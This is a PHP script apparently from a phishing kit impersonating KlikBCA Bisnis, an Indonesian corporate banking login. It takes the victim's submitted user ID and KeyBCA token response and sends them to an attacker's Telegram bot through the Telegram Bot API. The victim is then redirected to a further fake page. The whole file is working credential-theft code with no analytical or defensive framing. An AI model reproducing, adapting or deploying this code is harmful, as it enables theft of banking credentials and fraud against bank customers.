<?php
include "../telegram.php";
session_start();

$user = $_POST['user'];
$pass = $_POST['pass'];


$_SESSION['user'] = $user;
$_SESSION['pass'] = $pass;


$message = "
( *KLIK BCA BISNIS* )

- *UserID :* ".$user."
- *KeyBCA Appli 1 :* ".$pass."
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../key.html');
?>
